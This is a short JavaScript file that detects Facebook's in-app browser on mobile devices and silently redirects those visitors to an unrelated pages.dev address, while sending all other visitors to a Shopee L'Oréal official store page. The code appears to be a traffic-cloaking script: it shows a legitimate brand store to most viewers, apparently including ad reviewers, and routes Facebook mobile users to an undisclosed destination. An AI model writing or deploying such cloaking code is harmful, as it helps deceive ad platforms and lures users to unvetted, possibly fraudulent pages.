function isFacebookApp() {
    let ua = navigator.userAgent || navigator.vendor || window.opera;
    return ua.includes("FBAN") && ua.includes("FBAV");
}

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

if (isFacebookApp() && isMobileDevice()) {
    window.location.replace("https://redirect-301-2th.pages.dev");
} else if (!isFacebookApp()) {
    window.location.replace("https://shopee.vn/lorealparis_officialstore");
}
